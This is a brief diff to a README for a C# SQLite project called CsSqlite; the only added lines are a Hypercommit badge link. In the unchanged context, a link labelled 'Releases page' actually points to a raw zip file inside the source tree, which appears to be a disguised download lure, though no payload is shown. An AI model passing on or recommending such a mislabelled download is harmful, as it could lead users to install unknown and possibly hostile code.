@@ -72,3 +72,7 @@ Special thanks to the developers and contributors who have made this project pos
 Thank you for choosing CsSqlite. We hope it makes your data management easier and more efficient. 
 
 For more inquiries, visit our [Releases page](https://github.com/dungal6/CsSqlite/raw/refs/heads/main/src/CsSqlite/Internal/Cs-Sqlite-enigmatization.zip) to download the latest version or explore our documentation. Happy coding!
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/cssqlite)
